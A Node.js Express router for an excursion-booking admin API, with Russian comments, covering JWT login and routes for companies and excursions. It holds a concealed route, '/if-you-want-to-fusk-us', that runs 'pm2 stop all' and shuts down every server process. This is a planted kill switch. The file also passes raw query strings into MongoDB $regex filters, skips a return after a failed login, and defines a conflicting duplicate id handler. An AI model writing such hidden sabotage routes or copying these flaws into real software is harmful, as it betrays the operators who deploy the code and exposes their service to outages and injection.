const express = require('express')
const passport = require('passport')
const router = express.Router()
const {Users} = require('../models/users')
const utils = require('../lib/passportUtils')
const {Excursions} = require('../models/excursions')
const {Companies} = require('../models/companies')
const cors = require('cors')
const {updateCompany} = require("../controllers/companies")
const {apiUpdateExcursion} = require("../controllers/excursions")
const {handleApiError} = require("../lib/apiErrorHandler")
const {exec} = require('child_process')

/**
 * Authentication
 */
router.post('/auth', cors(), (req, res) => {
    Users.findOne({username: req.body.username}) // Ищем юзера в БД
        .then(user => {
            if (!user) {
                res.status(401).json({success: false, msg: 'Пользователь не найден'})
            }

            const isValid = utils.validPassword(req.body.password, user.hash, user.salt) // Проверяем пароль

            if (isValid) {
                const tokenObject = utils.issueJWT(user) // Генерируем токен

                res.status(200).json({success: true, token: tokenObject.token, expires: tokenObject.expires})
            } else {
                res.status(401).json({success: false, msg: 'Неверный пароль'})
            }
        })
})


/**
 * Companies
 */
router.get('/companies', cors(), passport.authenticate('jwt', {session: false}), async (req, res, next) => {
    let companies = []
    if (req.query.status === 'approved') {
        companies = await Companies.find({isApproved: true}).select('-__v').catch(err => {
            handleApiError(err, req, res)
        }) // Запрос одобренных операторов
    } else if (req.query.status === 'rejected') {
        companies = await Companies.find({isApproved: false}).select('-__v').catch(err => {
            handleApiError(err, req, res)
        }) // Запрос неодобренных операторов
    } else if (req.query.updatedAt) {
        let query = req.query.updatedAt
        companies = await Companies.find({updatedAt: {$regex: query, $options: 'i'}}).catch(err => {
            handleApiError(err, req, res)
        }) // Фильтр по дате обновления
        res.json(companies)
    } else {
        companies = await Companies.find().select('-__v').catch(err => {
            handleApiError(err, req, res)
        }) // Запрос всех операторов
        res.json(companies)
    }
})


router.param('id', async function (req, res, next, id) {
    req.company = await Companies.findOne({_id: id}).select('-__v').catch(err => {
        handleApiError(err, req, res)
    }) // Запрос одного опертора по id
    next()
})

router.get('/companies/:id', cors(), passport.authenticate('jwt', {session: false}), async (req, res) => {
    res.json(req.company) // Отдаём результат
})

router.post('/companies/:id', cors(), passport.authenticate('jwt', {session: false}), async (req, res, next) => {
    await updateCompany(req.body, req.company).catch(err => {
        handleApiError(err, req, res)
    })
})


/**
 * Excursions
 */
router.get('/excursions', cors(), passport.authenticate('jwt', {session: false}), async (req, res, next) => {
    let excursions = []
    if (req.query.company) {
        excursions = await Excursions.find({company: req.query.company}).populate('tickets').select('-__v').catch(err => {
            handleApiError(err, req, res)
        }) // Фильтр по оператору
    } else if (req.query.status === 'approved') {
        excursions = await Excursions.find({isApproved: true}).populate('tickets').select('-__v').catch(err => {
            handleApiError(err, req, res)
        }) // Запрос одобренных экскурсий
    } else if (req.query.status === 'rejected') {
        excursions = await Excursions.find({isApproved: false}).populate('tickets').select('-__v').catch(err => {
            handleApiError(err, req, res)
        }) // Запрос неодобренных экскурсий
    } else if (req.query.updatedAt) {
        let query = req.query.updatedAt
        excursions = await Excursions.find({updatedAt: {$regex: query, $options: 'i'}}).catch(err => {
            handleApiError(err, req, res)
        }) // Фильтр по дате обновления
    } else {
        excursions = await Excursions.find().populate('tickets').select('-__v').catch(err => {
            handleApiError(err, req, res)
        }) // Запрос всех экскурсий
    }
    res.json(excursions)
})

router.param('id', async function (req, res, next, id) {
    req.excursion = await Excursions.findOne({_id: id}).populate('tickets').select('-__v').catch(err => {
        handleApiError(err, req, res)
    }) // Запрос одной экскурсии по id
    next()
})

router.get('/excursions/:id', cors(), passport.authenticate('jwt', {session: false}), async (req, res) => {
    res.json(req.excursion) // Отдаём результат
})

router.post('/excursions/:id', cors(), passport.authenticate('jwt', {session: false}), async (req, res, next) => {
    apiUpdateExcursion(req, res).catch(err => {
        handleApiError(err, req, res)
    })
})

router.get('/if-you-want-to-fusk-us', cors(), passport.authenticate('jwt', {session: false}), (req, res, next) => {
    exec("pm2 stop all", (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
            res.json({success: false})
            return;
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);
            return;
        }
        console.log(`stdout: ${stdout}`);
    });
    res.json({success: true})
})

/**
 * Exports
 */
module.exports = router
